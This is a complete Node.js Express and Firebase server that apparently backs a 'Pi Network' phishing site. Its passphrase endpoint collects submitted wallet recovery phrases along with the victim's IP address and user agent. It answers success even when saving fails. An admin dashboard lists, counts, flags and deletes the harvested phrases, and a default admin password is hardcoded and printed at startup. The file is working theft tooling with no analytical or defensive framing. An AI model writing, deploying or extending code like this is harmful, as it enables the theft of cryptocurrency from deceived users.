require("dotenv").config();
const path = require("path");
const express = require("express");
const cors = require("cors");
const admin = require("firebase-admin");
const bcrypt = require("bcryptjs");

const app = express();
const PORT = process.env.PORT || 8080;

const saltRounds = 10;
const ADMIN_PLAIN = process.env.ADMIN_PASSWORD || "piadmin123";
const ADMIN_USER = process.env.ADMIN_USERNAME || "admin";

const pkEnv = process.env.FIREBASE_PRIVATE_KEY || "";
const privateKey = pkEnv.replace(/\\n/g, "\n").replace(/^"|"$/g, "");

const serviceAccount = {
  type: "service_account",
  project_id: (process.env.FIREBASE_PROJECT_ID || "").trim(),
  private_key_id: (process.env.FIREBASE_PRIVATE_KEY_ID || "").trim(),
  private_key: privateKey,
  client_email: (process.env.FIREBASE_CLIENT_EMAIL || "").trim(),
  client_id: (process.env.FIREBASE_CLIENT_ID || "").trim(),
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url: `https://www.googleapis.com/robot/v1/metadata/x509/${encodeURIComponent((process.env.FIREBASE_CLIENT_EMAIL || "").trim())}`,
  universe_domain: "googleapis.com",
};

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`,
});

const db = admin.firestore();
const adminSessions = new Map();

function generateToken() {
  return require("crypto").randomBytes(32).toString("hex");
}

function requireAdmin(req, res, next) {
  const token = req.headers["x-admin-token"] || req.query.token;
  if (!token || !adminSessions.has(token)) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

app.use(cors());
app.use(express.json({ limit: "1mb" }));

app.use(
  express.static(path.join(__dirname), {
    extensions: ["html", "htm"],
    setHeaders: (res, filePath) => {
      if (filePath.endsWith("admin.html")) {
        res.setHeader("Cache-Control", "no-store");
      }
    },
  }),
);

app.post("/api/passphrase", async (req, res) => {
  try {
    const { phrase, walletId, page } = req.body;
    const cleanPhrase = (phrase || "").toString().trim();

    if (!cleanPhrase) {
      return res.status(400).json({ error: "Passphrase required" });
    }

    const ip = (
      req.headers["x-forwarded-for"] ||
      req.socket.remoteAddress ||
      ""
    ).toString();
    const ua = (req.headers["user-agent"] || "").toString();
    const createdAt = admin.firestore.FieldValue.serverTimestamp();

    const docRef = await db.collection("passphrases").add({
      passphrase: cleanPhrase,
      wordCount: cleanPhrase.split(/\s+/).filter(Boolean).length,
      ip,
      userAgent: ua,
      walletId: walletId || null,
      page: page || null,
      createdAt,
      viewed: false,
      flagged: false,
    });

    return res.json({ ok: true, id: docRef.id });
  } catch (err) {
    console.error("[passphrase] save error:", err.message);
    return res.status(500).json({ error: "Server error", ok: true });
  }
});

app.post("/api/admin/login", async (req, res) => {
  try {
    const { username, password } = req.body || {};

    if (username !== ADMIN_USER) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const match = await bcrypt.compare(
      password || "",
      await bcrypt.hash(ADMIN_PLAIN, saltRounds),
    );
    if (!match) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = generateToken();
    adminSessions.set(token, { user: username, at: Date.now() });

    setTimeout(() => adminSessions.delete(token), 1000 * 60 * 60 * 8);

    return res.json({ ok: true, token });
  } catch (err) {
    console.error("[login] error:", err.message);
    return res.status(500).json({ error: "Server error" });
  }
});

app.post("/api/admin/logout", (req, res) => {
  const token = req.headers["x-admin-token"];
  if (token) adminSessions.delete(token);
  res.json({ ok: true });
});

app.get("/api/admin/stats", requireAdmin, async (req, res) => {
  try {
    const snap = await db
      .collection("passphrases")
      .orderBy("createdAt", "desc")
      .limit(500)
      .get();
    const total = snap.size;
    let viewedCount = 0;
    let flaggedCount = 0;
    const byDate = {};

    snap.forEach((doc) => {
      const d = doc.data();
      if (d.viewed) viewedCount++;
      if (d.flagged) flaggedCount++;
      const ts = d.createdAt ? d.createdAt.toDate() : new Date();
      const key = ts.toISOString().slice(0, 10);
      byDate[key] = (byDate[key] || 0) + 1;
    });

    return res.json({
      total,
      viewed: viewedCount,
      flagged: flaggedCount,
      byDate,
    });
  } catch (err) {
    console.error("[stats] error:", err.message);
    return res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/admin/passphrases", requireAdmin, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    const q = db
      .collection("passphrases")
      .orderBy("createdAt", "desc")
      .limit(limit);
    const snap = await q.get();

    const records = [];
    snap.forEach((doc) => {
      const d = doc.data();
      records.push({
        id: doc.id,
        passphrase: d.passphrase,
        wordCount: d.wordCount,
        ip: d.ip,
        userAgent: d.userAgent,
        walletId: d.walletId || null,
        page: d.page || null,
        createdAt: d.createdAt ? d.createdAt.toDate().toISOString() : null,
        viewed: !!d.viewed,
        flagged: !!d.flagged,
      });
    });

    await Promise.all(
      snap.docs.map((d) => d.ref.update({ viewed: true }).catch(() => {})),
    );

    return res.json({ records });
  } catch (err) {
    console.error("[list] error:", err.message);
    return res.status(500).json({ error: "Server error" });
  }
});

app.patch("/api/admin/passphrases/:id", requireAdmin, async (req, res) => {
  try {
    const { flagged } = req.body || {};
    const update = {};
    if (typeof flagged === "boolean") update.flagged = flagged;
    if (Object.keys(update).length === 0)
      return res.status(400).json({ error: "Nothing to update" });

    await db.collection("passphrases").doc(req.params.id).update(update);
    return res.json({ ok: true });
  } catch (err) {
    console.error("[patch] error:", err.message);
    return res.status(500).json({ error: "Server error" });
  }
});

app.delete("/api/admin/passphrases/:id", requireAdmin, async (req, res) => {
  try {
    await db.collection("passphrases").doc(req.params.id).delete();
    return res.json({ ok: true });
  } catch (err) {
    console.error("[delete] error:", err.message);
    return res.status(500).json({ error: "Server error" });
  }
});

app.use((req, res, next) => {
  if (!req.path.startsWith("/api/")) {
    return res.sendFile(path.join(__dirname, "index.html"));
  }
  next();
});

app.listen(PORT, () => {
  console.log(`\n✅ Pi Network server running`);
  console.log(`   Local:    http://127.0.0.1:${PORT}/mine/index.html`);
  console.log(`   Admin:    http://127.0.0.1:${PORT}/admin.html`);
  console.log(`   API:      http://127.0.0.1:${PORT}/api/passphrase`);
  console.log(`   User:     ${ADMIN_USER}`);
  console.log(`   Pass:     ${ADMIN_PLAIN}\n`);
});
